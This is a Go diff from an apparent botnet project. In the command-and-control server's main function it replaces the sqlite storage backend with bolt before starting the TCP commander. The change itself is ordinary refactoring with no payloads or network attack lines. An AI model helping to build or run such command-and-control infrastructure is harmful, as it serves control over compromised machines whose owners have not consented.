@@ -8,8 +8,8 @@ import (
 
 	"github.com/rodzzlessa24/botnet/tcp"
 
+	"github.com/rodzzlessa24/botnet/bolt"
 	"github.com/rodzzlessa24/botnet/http"
-	"github.com/rodzzlessa24/botnet/sqlite"
 )
 
 var (
@@ -27,12 +27,16 @@ func main() {
 		httpAddress = ":" + *webPortPtr
 	}
 
-	db, err := sqlite.Open("./cc.db")
+	db, err := bolt.Open("./cc.db")
 	if err != nil {
 		log.Panic(err)
 	}
 	defer db.Close()
-	storage := &sqlite.Client{DB: db}
+	c, err := bolt.NewClient(db)
+	if err != nil {
+		log.Panic(err)
+	}
+	storage := c
 
 	commander := tcp.NewCC(*hostPtr, *portPtr, storage)
 	go commander.Listen()
